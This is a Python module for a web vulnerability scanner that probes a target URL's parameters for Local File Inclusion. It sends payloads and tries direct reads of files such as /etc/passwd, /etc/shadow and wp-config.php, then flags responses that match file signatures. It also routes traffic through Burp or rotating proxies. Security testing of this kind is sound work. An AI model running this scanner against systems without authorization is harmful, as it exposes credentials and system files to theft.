"""
LFI (Local File Inclusion) Checker Module
Provides functionality to test for Local File Inclusion vulnerabilities
"""

import requests
import time
from urllib.parse import urljoin, quote
from utils.logger import Logger
from utils.proxy import ProxyManager


class LFIChecker:
    """Local File Inclusion vulnerability checker"""
    
    def __init__(self, target_url, payloads_file="payloads/lfi.txt", use_proxy=False):
        """
        Initialize LFI Checker
        
        Args:
            target_url (str): Target URL to test
            payloads_file (str): Path to LFI payloads file
            use_proxy (bool/dict): Whether to use proxy for requests, or proxy dict for Burp
        """
        self.target_url = target_url
        self.payloads_file = payloads_file
        self.use_proxy = use_proxy
        self.logger = Logger("lfi_checker")
        
        # Handle different proxy configurations
        if isinstance(use_proxy, dict):
            # Direct proxy configuration (e.g., Burp Suite)
            self.proxy_config = use_proxy
            self.proxy_manager = None
        elif use_proxy:
            # Use proxy manager
            self.proxy_manager = ProxyManager()
            self.proxy_config = None
        else:
            self.proxy_manager = None
            self.proxy_config = None
        self.payloads = self._load_payloads()
        
        # Common file signatures to detect successful LFI
        self.file_signatures = {
            'passwd': ['root:x:0:0:', 'daemon:x:1:1:', '/bin/bash', '/bin/sh'],
            'hosts': ['127.0.0.1', 'localhost', '::1'],
            'httpd.conf': ['ServerRoot', 'DocumentRoot', 'DirectoryIndex'],
            'nginx.conf': ['server_name', 'listen', 'root'],
            'web.config': ['<configuration>', '<system.web>', '<appSettings>'],
            'wp-config.php': ['DB_NAME', 'DB_USER', 'DB_PASSWORD', 'DB_HOST']
        }
        
    def _load_payloads(self):
        """Load LFI payloads from file"""
        try:
            with open(self.payloads_file, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except FileNotFoundError:
            self.logger.error(f"Payloads file {self.payloads_file} not found")
            return []
    
    def test_parameter(self, param_name, param_value):
        """
        Test a specific parameter for LFI
        
        Args:
            param_name (str): Parameter name
            param_value (str): Original parameter value
            
        Returns:
            list: Found vulnerabilities
        """
        vulnerabilities = []
        
        for payload in self.payloads:
            try:
                # Create test URL with payload
                test_params = {param_name: payload}
                
                # Make request
                if self.proxy_config:
                    # Use direct proxy configuration (Burp)
                    proxies = self.proxy_config
                elif self.proxy_manager:
                    # Use proxy manager
                    proxies = self.proxy_manager.get_proxy()
                else:
                    proxies = None
                    
                response = requests.get(
                    self.target_url,
                    params=test_params,
                    proxies=proxies,
                    timeout=10
                )
                
                # Check for LFI indicators
                detected_file = self._check_lfi_indicators(response.text)
                if detected_file:
                    vulnerability = {
                        'type': 'Local File Inclusion (LFI)',
                        'parameter': param_name,
                        'payload': payload,
                        'url': response.url,
                        'status_code': response.status_code,
                        'detected_file': detected_file,
                        'confidence': self._calculate_confidence(detected_file, response.text)
                    }
                    vulnerabilities.append(vulnerability)
                    self.logger.info(f"LFI vulnerability found in parameter: {param_name} (file: {detected_file})")
                
                # Rate limiting
                time.sleep(0.5)
                
            except Exception as e:
                self.logger.error(f"Error testing parameter {param_name}: {str(e)}")
        
        return vulnerabilities
    
    def _check_lfi_indicators(self, response_text):
        """
        Check response for LFI indicators
        
        Args:
            response_text (str): HTTP response text
            
        Returns:
            str: Detected file type or None
        """
        response_lower = response_text.lower()
        
        for file_type, signatures in self.file_signatures.items():
            matches = sum(1 for sig in signatures if sig.lower() in response_lower)
            
            # If we find multiple signatures for a file type, it's likely LFI
            if matches >= 2:
                return file_type
            
            # For some files, even one strong signature is enough
            if file_type == 'passwd' and any(sig in response_text for sig in signatures[:2]):
                return file_type
        
        return None
    
    def _calculate_confidence(self, detected_file, response_text):
        """
        Calculate confidence level for LFI detection
        
        Args:
            detected_file (str): Type of file detected
            response_text (str): HTTP response text
            
        Returns:
            str: Confidence level (High/Medium/Low)
        """
        if not detected_file:
            return "Low"
        
        signatures = self.file_signatures.get(detected_file, [])
        matches = sum(1 for sig in signatures if sig.lower() in response_text.lower())
        
        if matches >= 3:
            return "High"
        elif matches >= 2:
            return "Medium"
        else:
            return "Low"
    
    def test_common_files(self, param_name):
        """
        Test for common system files that are often targeted in LFI attacks
        
        Args:
            param_name (str): Parameter name to test
            
        Returns:
            list: Found vulnerabilities
        """
        common_files = [
            # Linux/Unix files
            '/etc/passwd',
            '/etc/shadow',
            '/etc/hosts',
            '/etc/hostname',
            '/proc/version',
            '/proc/cmdline',
            
            # Windows files
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            'C:\\Windows\\win.ini',
            'C:\\Windows\\system.ini',
            
            # Web server configs
            '/etc/httpd/conf/httpd.conf',
            '/etc/nginx/nginx.conf',
            '/var/log/apache/access.log',
            
            # Application configs
            '/var/www/html/wp-config.php',
            '/var/www/html/config.php'
        ]
        
        vulnerabilities = []
        
        for file_path in common_files:
            try:
                # Test direct path
                test_params = {param_name: file_path}
                
                if self.proxy_config:
                    # Use direct proxy configuration (Burp)
                    proxies = self.proxy_config
                elif self.proxy_manager:
                    # Use proxy manager
                    proxies = self.proxy_manager.get_proxy()
                else:
                    proxies = None
                
                response = requests.get(
                    self.target_url,
                    params=test_params,
                    proxies=proxies,
                    timeout=10
                )
                
                detected_file = self._check_lfi_indicators(response.text)
                if detected_file:
                    vulnerability = {
                        'type': 'Local File Inclusion (LFI)',
                        'parameter': param_name,
                        'payload': file_path,
                        'url': response.url,
                        'status_code': response.status_code,
                        'detected_file': detected_file,
                        'confidence': self._calculate_confidence(detected_file, response.text)
                    }
                    vulnerabilities.append(vulnerability)
                    self.logger.info(f"LFI found with direct file access: {file_path}")
                
                time.sleep(0.5)
                
            except Exception as e:
                self.logger.error(f"Error testing file {file_path}: {str(e)}")
        
        return vulnerabilities
    
    def scan(self, parameters=None):
        """
        Perform comprehensive LFI scan
        
        Args:
            parameters (dict): Parameters to test (if None, will test common parameters)
            
        Returns:
            list: All found vulnerabilities
        """
        self.logger.info(f"Starting LFI scan on {self.target_url}")
        all_vulnerabilities = []
        
        if parameters:
            for param_name, param_value in parameters.items():
                # Test with payloads
                vulns = self.test_parameter(param_name, param_value)
                all_vulnerabilities.extend(vulns)
                
                # Test common files
                file_vulns = self.test_common_files(param_name)
                all_vulnerabilities.extend(file_vulns)
        else:
            # Test common parameters
            common_params = ['file', 'page', 'include', 'path', 'document', 'folder', 'root']
            for param in common_params:
                vulns = self.test_parameter(param, "")
                all_vulnerabilities.extend(vulns)
                
                file_vulns = self.test_common_files(param)
                all_vulnerabilities.extend(file_vulns)
        
        self.logger.info(f"LFI scan completed. Found {len(all_vulnerabilities)} vulnerabilities")
        return all_vulnerabilities
